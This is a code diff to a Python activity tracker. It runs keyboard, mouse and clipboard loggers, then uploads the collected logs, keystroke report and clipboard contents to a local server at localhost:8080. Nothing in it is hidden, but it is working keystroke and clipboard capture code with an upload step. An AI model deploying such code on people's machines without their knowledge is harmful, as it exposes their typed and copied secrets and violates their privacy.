@@ -1,6 +1,10 @@
+import asyncio
+
 import keyboard
+import requests
 
 from ClipboardTracker import ClipboardTracker
+from WebSocketClient import WebSocketClient
 from configs.file_writers import save_to_report, save_clipboard_content
 from configs.hotkeys import double_hotkeys
 from configs.logger import get_logger
@@ -8,7 +12,7 @@ from loggers.KeyboardLogger import KeyboardLogger
 from loggers.MouseLogger import MouseLogger
 
 
-def main():
+async def main():
     logger = get_logger(__name__)
 
     logger.info("Start tracking actions")
@@ -17,25 +21,52 @@ def main():
                             lambda shortcut_name: save_to_report(shortcut_name, path=".\\report.txt"),
                             args=(name,))
 
-    clipboard_tracker = ClipboardTracker(save_clipboard_content)
+    socket = WebSocketClient("ws://localhost:8080/connection/ws")
+    await socket.connect()
 
     keyboard_logger = KeyboardLogger()
-    keyboard_logger.create_listener()
 
     mouse_logger = MouseLogger()
-    mouse_logger.create_listener()
+
+    loggers = [ClipboardTracker(save_clipboard_content), keyboard_logger.create_listener(), mouse_logger.create_listener()]
 
     try:
-        clipboard_tracker.start()
-        keyboard_logger.run()
-        mouse_logger.run()
+        start_resp = await socket.send_message("start")
+        print(start_resp)
+        logger.info(start_resp)
+
+        for tracker in loggers:
+            logger.info(f"Start {type(tracker).__name__}")
+            tracker.start()
+
         logger.info("Clipboard, mouse and keyboard tracker have started")
-    except KeyboardInterrupt:
-        keyboard_logger.stop()
-        mouse_logger.stop()
-        clipboard_tracker.stop()
+
+        while True:
+            await asyncio.sleep(1)
+
+    except (KeyboardInterrupt, asyncio.CancelledError):
+        for tracker in loggers:
+            logger.info(f"Start {type(tracker).__name__}")
+            tracker.stop()
+
+        finish_resp = await socket.send_message("finish")
+        print(finish_resp)
+        logger.info(finish_resp)
+
+        await socket.disconnect()
+
         logger.info("Stop tracking")
+
+    json_data = {
+        "files": [
+            {"name": "logs", "data": open('logs.txt').read()},
+            {"name": "report", "data": open('report.txt').read()},
+            {"name": "clipboard", "data": open('clipboard.txt').read()},
+        ]
+    }
+
+    requests.post("http://localhost:8080/connection/fileUpload", json=json_data)
 
 
 if __name__ == '__main__':
-    main()
+    asyncio.run(main())
